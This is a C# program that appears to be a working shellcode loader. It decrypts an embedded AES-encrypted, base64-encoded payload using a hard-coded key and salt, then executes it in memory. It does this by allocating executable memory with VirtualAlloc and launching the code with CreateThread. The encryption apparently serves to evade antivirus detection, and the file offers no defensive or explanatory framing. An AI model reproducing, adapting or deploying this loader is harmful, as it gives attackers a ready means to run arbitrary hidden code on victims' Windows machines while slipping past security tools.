using System;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text;
using System.IO;


namespace shell_exec_1
{
    class Program
    {
        private delegate Int32 Run();


        public static class Global
        {
            // set password
            public const string strPassword = "testtesttest";

            // set permutations
            public const String strPermutation = "ouiveyxaqtd";
            public const Int32 bytePermutation1 = 0x19;
            public const Int32 bytePermutation2 = 0x59;
            public const Int32 bytePermutation3 = 0x17;
            public const Int32 bytePermutation4 = 0x41;
        }

        static void Main(string[] args)
        {

            /*
            Console.WriteLine("UNENCRYPTED:");
            Console.WriteLine(Encoding.Default.GetString(buf));
            Console.WriteLine(new string('-' , 100));


            Byte[] e_data = Encrypt(buf);
            Console.WriteLine("ENCRYPTED:");
            Console.WriteLine(Encoding.Default.GetString(e_data));
            Console.WriteLine(new string('-', 100));

            Console.WriteLine("BASE64 ENCRYPTED:");
            Console.WriteLine(System.Convert.ToBase64String(e_data));
            Console.WriteLine(new string('-', 100));


            Byte[] d_data = Decrypt(e_data);


            String test_data = Encoding.Default.GetString(e_data);
            Byte[] test = Encoding.Default.GetBytes(test_data);
            Console.WriteLine("STRING TO BYTE ENCRYPTED:");
            Console.WriteLine(Encoding.Default.GetString(test));
            Console.WriteLine(new string('-', 100));
            */

            //--------------- B64 stuff
            String pretty = "ei2qy0sTra8eNbEL7vh6a6SuqTzrvGXraJAMmQfyYXba0l2OtHf4Tx9ihK1PxsdE5b0777BOwCA1mjD/Juzs+FajEebm6tseHjn3bGgimwDzdEGxVrbuYp9oamt9viGlLJEwOaXkh8UxTi3KnNMLzI2URiyHkEA7Kb9OP7k29FkLXBXOKu4itGewSSp/qTuzXvgmCOScgRfw/kulLjKN19B4M9r4Lf3FdNkW+3jvjuE5sCzm9KjuXtfi+5bdrnIL5hqk2ZGHhcee3zdsUSt4J1UCS8MW8TomNAaYxklNIluSa3AK5+utLyhICUBR0mnkTvve90733Dk2sWyo+L6RQBCtQiQjjIRT5akCpdZc3DvVyV6XamgDK8Go+0SgEcF3OXyaLYOb/3+x0DSu3JRNsugWEH2Sp/uPHgTpG9zucGIN5RlRUtBEHKkhG27C+GvOSbemVloICUTGx9GONfcFxGkacS8mTvZoOKPr5/DglMKqLxc2iqRASqZeY8TQfsr2HPjuFKFSCiaahN3MC4Hd1goCS65OC22aW3fqzNJcg2aCYgPERE6L6PKrEcRV18lwa0hAdAbDuo+nnp0Bg9Mq/h2rtpM+t2gnfJNb7Pnr7/Pr2NQlx2icdvWXT/gDn8GRSLLOeJ8Hf4kfHjcyDDlF7znKId4kuCtl8NNEo4swom+vMjzkA0Bgt+p77sR/P4ZzP8ybebX8PmE9gRZFCzjLPQ==";
            Byte[] de_pretty = Decrypt(Convert.FromBase64String(pretty));


            bool test1 = hiphop(de_pretty);
            

        }

        public static bool hiphop(byte[] shellcode)
        {

            try
            {
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                // prepare data

                IntPtr pinfo = IntPtr.Zero;

                // execute native code

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("ShellCodeExecute exception: " + e.Message);
                return false;
            }
        }



        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
        );

        // encrypt
        public static byte[] Encrypt(byte[] strData)
        {
            PasswordDeriveBytes passbytes =
            new PasswordDeriveBytes(Global.strPermutation,
            new byte[] { Global.bytePermutation1,
                         Global.bytePermutation2,
                         Global.bytePermutation3,
                         Global.bytePermutation4
            });

            MemoryStream memstream = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = passbytes.GetBytes(aes.KeySize / 8);
            aes.IV = passbytes.GetBytes(aes.BlockSize / 8);

            CryptoStream cryptostream = new CryptoStream(memstream,
            aes.CreateEncryptor(), CryptoStreamMode.Write);
            cryptostream.Write(strData, 0, strData.Length);
            cryptostream.Close();
            return memstream.ToArray();
        }

        // decrypt
        public static byte[] Decrypt(byte[] strData)
        {
            PasswordDeriveBytes passbytes =
            new PasswordDeriveBytes(Global.strPermutation,
            new byte[] { Global.bytePermutation1,
                         Global.bytePermutation2,
                         Global.bytePermutation3,
                         Global.bytePermutation4
            });

            MemoryStream memstream = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = passbytes.GetBytes(aes.KeySize / 8);
            aes.IV = passbytes.GetBytes(aes.BlockSize / 8);

            CryptoStream cryptostream = new CryptoStream(memstream,
            aes.CreateDecryptor(), CryptoStreamMode.Write);
            cryptostream.Write(strData, 0, strData.Length);
            cryptostream.Close();
            return memstream.ToArray();
        }

        public static bool ByteArrayToFile(string fileName, byte[] byteArray)
        {
            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    fs.Write(byteArray, 0, byteArray.Length);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in process: {0}", ex);
                return false;
            }
        }

    }

}

